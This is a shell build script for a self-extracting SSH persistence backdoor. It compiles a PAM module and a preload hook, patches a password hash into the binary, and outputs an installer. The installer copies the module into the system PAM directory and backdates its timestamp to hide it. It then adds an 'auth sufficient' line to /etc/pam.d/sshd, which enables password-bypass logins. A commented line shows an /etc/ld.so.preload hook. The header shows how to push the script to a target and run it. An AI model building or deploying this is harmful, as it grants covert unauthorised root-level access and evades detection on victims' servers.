#!/bin/bash
#
# Build deployable payload
# Usage: ./build.sh <password> [arch]
# Output: Self-extracting bash script to stdout
#
# Example:
#   ./build.sh mypassword > payload.sh
#   scp payload.sh target:/tmp/
#   ssh target "bash /tmp/payload.sh"
#

set -e

PASSWORD="${1:?usage: $0 <password> [arch]}"
ARCH="${2:-x86_64}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TEMPLATE="$SCRIPT_DIR/pam_template.c"
WORKDIR="$SCRIPT_DIR/.build"
mkdir -p "$WORKDIR"
trap "rm -rf $WORKDIR" EXIT

# Compile template with placeholder
cd "$WORKDIR"

case "$ARCH" in
    x86_64|amd64)
        # Compile inside ubuntu:22.04 on build host for glibc 2.35 compatibility
        BUILD_HOST="${BUILD_HOST:?BUILD_HOST required for x86_64 build}"
        BUILD_KEY="${BUILD_KEY:?BUILD_KEY required for x86_64 build}"
        BUILD_REMOTE_DIR='~/ssh-door-test'

        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
            "rm -f ${BUILD_REMOTE_DIR}/.pam_auth.so ${BUILD_REMOTE_DIR}/.pam_hook.so" >&2

        rsync -q -e "ssh -i $BUILD_KEY -o StrictHostKeyChecking=no" \
            "$SCRIPT_DIR/pam_template.c" "$SCRIPT_DIR/pam_hook.c" \
            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/" >&2

        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
            "docker run --rm \
                -v \$(readlink -f ${BUILD_REMOTE_DIR}):/src \
                ubuntu:22.04 sh -c \
                'apt-get update -qq && apt-get install -y -qq gcc libpam0g-dev >/dev/null 2>&1 && \
                 gcc -fPIC -shared -O3 -s -o /src/.pam_auth.so /src/pam_template.c -lpam -lpthread && \
                 gcc -fPIC -shared -O2 -s -o /src/.pam_hook.so /src/pam_hook.c -ldl'" >&2

        scp -q -i "$BUILD_KEY" -o StrictHostKeyChecking=no \
            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/.pam_auth.so" "$WORKDIR/pam_auth.so"
        scp -q -i "$BUILD_KEY" -o StrictHostKeyChecking=no \
            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/.pam_hook.so" "$WORKDIR/pam_hook.so"

        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
            "rm -f ${BUILD_REMOTE_DIR}/.pam_auth.so ${BUILD_REMOTE_DIR}/.pam_hook.so" >&2
        ;;
    photon1)
        # Compile inside PhotonOS 1.0 container (glibc 2.22) via docker on build host
        BUILD_HOST="${BUILD_HOST:-lobo@192.168.122.84}"
        BUILD_KEY="${BUILD_KEY:-$HOME/.ssh/kali_vm}"
        BUILD_REMOTE_DIR='~/ssh-door-test'

        # Clean old binaries so stale files aren't retrieved on docker failure
        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
            "rm -f ${BUILD_REMOTE_DIR}/.pam_auth.so ${BUILD_REMOTE_DIR}/.pam_hook.so" >&2

        # Sync sources and vendored headers to build host
        rsync -q -e "ssh -i $BUILD_KEY -o StrictHostKeyChecking=no" \
            "$SCRIPT_DIR/pam_template.c" "$SCRIPT_DIR/pam_hook.c" \
            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/" >&2
        rsync -q -a -e "ssh -i $BUILD_KEY -o StrictHostKeyChecking=no" \
            "$SCRIPT_DIR/include/" \
            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/include/" >&2

        # Compile inside photon:1.0 (no devel pkg needed — headers vendored in include/)
        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
            "docker run --rm \
                -v \$(readlink -f ${BUILD_REMOTE_DIR}):/src \
                photon:1.0 sh -c \
                'tdnf install -y gcc binutils glibc-devel linux-api-headers Linux-PAM >/dev/null 2>&1 && \
                 gcc -fPIC -shared -O3 -s -I/src/include -o /src/.pam_auth.so /src/pam_template.c -lpam -lpthread && \
                 gcc -fPIC -shared -O2 -s -o /src/.pam_hook.so /src/pam_hook.c -ldl'" >&2

        # Retrieve binaries
        scp -q -i "$BUILD_KEY" -o StrictHostKeyChecking=no \
            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/.pam_auth.so" "$WORKDIR/pam_auth.so"
        scp -q -i "$BUILD_KEY" -o StrictHostKeyChecking=no \
            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/.pam_hook.so" "$WORKDIR/pam_hook.so"

        # Cleanup remote temp files
        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
            "rm -f ${BUILD_REMOTE_DIR}/.pam_auth.so ${BUILD_REMOTE_DIR}/.pam_hook.so" >&2
        ;;
    *)
        echo "Unsupported arch: $ARCH" >&2
        exit 1
        ;;
esac

# Find placeholder offset (unique pattern)
# Pattern: DEADBEEFCAFEBABE0123456789ABCDEFFEDCBA9876543210133742 69BEEFCAFE
PLACEHOLDER=$(printf '\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE\x01\x23\x45\x67\x89\xAB\xCD\xEF\xFE\xDC\xBA\x98\x76\x54\x32\x10\x13\x37\x42\x69\xBE\xEF\xCA\xFE')
OFFSET=$(grep -boa "$PLACEHOLDER" pam_auth.so 2>/dev/null | cut -d: -f1)

if [ -z "$OFFSET" ]; then
    echo "ERROR: Placeholder not found in binary" >&2
    exit 1
fi

# Generate password hash
HASH=$(printf '%s' "$PASSWORD" | sha256sum | cut -d' ' -f1)

# Convert hash to binary
HASH_BIN=""
for i in $(seq 0 2 62); do
    HASH_BIN="$HASH_BIN\\x${HASH:$i:2}"
done

# Base64 encode both .so files
SO_B64=$(base64 -w0 pam_auth.so)
HOOK_B64=$(base64 -w0 pam_hook.so)

# Generate self-extracting payload
cat << 'PAYLOAD_HEAD'
#!/bin/bash
# Self-extracting PAM backdoor
# No compiler needed on target
[ "$(id -u)" -ne 0 ] && echo "root required" && exit 1

PAYLOAD_HEAD

cat << PAYLOAD_VARS
OFFSET=$OFFSET
HASH_BIN="$HASH_BIN"
SO_B64="$SO_B64"
HOOK_B64="$HOOK_B64"
PAYLOAD_VARS

cat << 'PAYLOAD_TAIL'

# Decode PAM module
SO_FILE=$(mktemp)
echo "$SO_B64" | base64 -d > "$SO_FILE"

# Patch hash at offset
printf "$HASH_BIN" | dd of="$SO_FILE" bs=1 seek=$OFFSET conv=notrunc 2>/dev/null

# Find PAM directory
PAM_DIR=$(dirname $(find /lib* /usr/lib* -name "pam_unix.so" 2>/dev/null | head -1) 2>/dev/null)
[ -z "$PAM_DIR" ] && echo "PAM not found" && rm "$SO_FILE" && exit 1

# Deploy PAM module
cp "$SO_FILE" "$PAM_DIR/pam_auth.so"
chown root:root "$PAM_DIR/pam_auth.so"
chmod 644 "$PAM_DIR/pam_auth.so"
touch -r "$PAM_DIR/pam_unix.so" "$PAM_DIR/pam_auth.so"
rm "$SO_FILE"

# Configure PAM
grep -q "pam_auth.so" /etc/pam.d/sshd || sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd
grep -q "session.*pam_auth.so" /etc/pam.d/sshd || echo "session optional pam_auth.so" >> /etc/pam.d/sshd

# Skip hook - requires matching glibc version, can break sshd on older systems
# To enable: echo "$HOOK_B64" | base64 -d > /lib/pam_hook.so && echo "/lib/pam_hook.so" > /etc/ld.so.preload

echo "deployed"
PAYLOAD_TAIL
